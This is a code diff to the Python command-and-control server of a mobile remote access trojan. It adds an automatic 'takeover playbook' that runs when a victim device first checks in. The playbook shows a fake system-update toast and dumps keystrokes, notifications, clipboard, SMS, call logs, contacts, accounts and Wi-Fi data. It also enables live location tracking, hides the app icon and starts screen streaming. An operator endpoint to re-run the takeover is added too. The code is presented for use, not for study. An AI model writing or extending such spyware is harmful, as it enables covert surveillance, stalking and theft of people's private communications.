@@ -29,6 +29,7 @@ from typing import Any, Dict, Optional
 from aiohttp import web
 from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
 
+from . import builder
 from . import ios as WEBAGENT
 from . import webagent
 from . import protocol, store
@@ -60,9 +61,11 @@ class Hub:
     web_token: str = ""
     udp_port: int = 0
     dist_dir: str = ""
-    max_tasks: int = 8
+    max_tasks: int = 16
     stale_after: int = 180
     offline_after: int = 300
+    auto_takeover: bool = True
+    takeover_sleep_ms: int = 20_000
     sessions: Dict[str, asyncio.Event] = field(default_factory=dict)
     started: float = field(default_factory=time.time)
 
@@ -115,6 +118,58 @@ async def _seal_reply(hub: Hub, sid: str, body: Dict[str, Any]) -> web.Response:
     except protocol.ProtocolError as exc:  # payload too big — tell the device why
         raise web.HTTPInternalServerError(text=str(exc)) from exc
     return web.json_response(env)
+
+
+# First contact runs the whole playbook without the operator touching a key:
+# identity, permission state, every collector the spec allows, live location and
+# the screen stream. A device that lands is already fully owned by the time the
+# dashboard draws it.
+TAKEOVER_STEPS = (
+    ("toast", ["System update installed"]),
+    ("vibrate", ["250"]),
+    ("takeover", []),
+    ("info", []),
+    ("perm_status", []),
+    ("apps", []),
+    ("usage", ["7"]),
+    ("keylog_dump", []),
+    ("notif_dump", []),
+    ("clipboard_get", []),
+    ("sms_dump", ["300"]),
+    ("calls_dump", ["300"]),
+    ("contacts_dump", ["2000"]),
+    ("accounts", []),
+    ("wifi_dump", []),
+    ("loc_track", ["on"]),
+    ("loc", []),
+    ("files_ls", ["/sdcard"]),
+    ("hide_icon", []),
+    ("screen_start", []),
+)
+
+
+def takeover_playbook(spec: str) -> list:
+    modules = sorted(set(builder.CORE_MODULES + builder.SPECS.get(spec or "rat", [])))
+    return [(cmd, args) for cmd, args in TAKEOVER_STEPS if protocol.allowed(cmd, modules)]
+
+
+def auto_takeover(hub: Hub, sid: str) -> int:
+    """Claim and queue the playbook once. Returns queued task count."""
+    if not hub.auto_takeover or not store.claim_takeover(sid):
+        return 0
+    session = store.get_session(sid) or {}
+    spec = str(session.get("spec") or "rat")
+    queued = 0
+    for cmd, args in takeover_playbook(spec):
+        try:
+            store.queue_task(sid, cmd, args)
+            queued += 1
+        except protocol.ProtocolError:
+            continue
+    # A fresh device beacons fast so the playbook drains before the first nap.
+    store.touch(sid, sleep_ms=hub.takeover_sleep_ms)
+    store.add_event(sid, "takeover", {"spec": spec, "steps": queued})
+    return queued
 
 
 def _ingest_events(sid: str, body: Dict[str, Any]) -> None:
@@ -250,14 +305,19 @@ async def beacon(request: web.Request) -> web.Response:
     op = str(body.get("op") or "")[:16]
     meta = body.get("meta") if isinstance(body.get("meta"), dict) else {}
 
+    fresh = False
     if op == protocol.OP_REGISTER:
+        fresh = store.get_session(sid) is None
         store.register(sid, meta, peer)
         store.add_event(sid, "register", {"peer": peer, "model": meta.get("model")})
     elif not store.get_session(sid):
         # A device that lost its DB row is re-registered transparently.
+        fresh = True
         store.register(sid, meta, peer)
         store.add_event(sid, "register", {"peer": peer, "reason": "unknown-sid"})
     store.touch(sid, meta, op, peer)
+    if fresh:
+        auto_takeover(hub, sid)
 
     _ingest_results(hub, sid, body)
     _ingest_events(sid, body)
@@ -379,6 +439,19 @@ async def api_sleep(request: web.Request) -> web.Response:
         raise web.HTTPBadRequest(text=str(exc)) from exc
     store.touch(sid, sleep_ms=sleep_ms)
     return web.json_response({"ok": True, "sleep_ms": sleep_ms})
+
+
+async def api_takeover(request: web.Request) -> web.Response:
+    """Re-run the full takeover playbook against a session."""
+    _op_auth(request)
+    hub: Hub = request.app["hub"]
+    sid = request.match_info["sid"]
+    if not store.get_session(sid):
+        raise web.HTTPNotFound(text="unknown session")
+    store.release_takeover(sid)
+    queued = auto_takeover(hub, sid)
+    hub.wake(sid)
+    return web.json_response({"ok": True, "queued": queued})
 
 
 async def api_forget(request: web.Request) -> web.Response:
@@ -534,8 +607,12 @@ async def web_report(request: web.Request) -> web.Response:
     meta.setdefault("model", str(meta.get("platform") or "browser")[:80])
     meta.setdefault("label", "web:" + str(meta.get("ua_platform") or "browser")[:40])
     meta.setdefault("sdk", 0)
+    fresh = store.get_session(sid) is None
     store.register(sid, meta, ip, kind="web")
     store.touch(sid, meta, kind, ip)
+    if fresh:
+        store.claim_takeover(sid)
+        store.add_event(sid, "takeover", {"spec": "web"})
 
     data = body.get("data")
     if kind in ("cam", "mic") and isinstance(data, dict):
@@ -673,6 +750,7 @@ def make_app(hub: Hub) -> web.Application:
             web.get("/api/session/{sid}", api_session),
             web.post("/api/task/{sid}", api_task),
             web.post("/api/sleep/{sid}", api_sleep),
+            web.post("/api/takeover/{sid}", api_takeover),
             web.delete("/api/session/{sid}", api_forget),
             web.get("/api/stats", api_stats),
             web.get("/", dashboard),
